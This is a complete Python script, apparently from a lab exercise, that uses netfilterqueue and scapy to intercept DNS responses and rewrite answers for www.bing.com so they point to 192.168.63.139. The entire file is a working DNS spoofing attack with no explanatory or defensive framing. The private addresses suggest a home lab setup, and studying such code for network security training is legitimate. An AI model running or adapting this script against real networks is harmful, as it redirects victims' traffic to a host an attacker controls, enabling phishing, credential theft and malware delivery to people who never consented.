#!/usr/bin/env python3
import netfilterqueue
from scapy.layers.inet import IP
from scapy.layers.dns import DNSRR, DNSQR, DNS, UDP

target_ip_vm = " 192.168.63.174"
target_interface_vm = "Ethernet0"

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        if b"www.bing.com" in qname:
            print("[+] Spoofing Target", end=" ")
            answer = DNSRR(rrname=qname, rdata="192.168.63.139")
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            if scapy_packet.haslayer(UDP):
                del scapy_packet[UDP].len
                del scapy_packet[UDP].chksum
            packet.set_payload(bytes(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


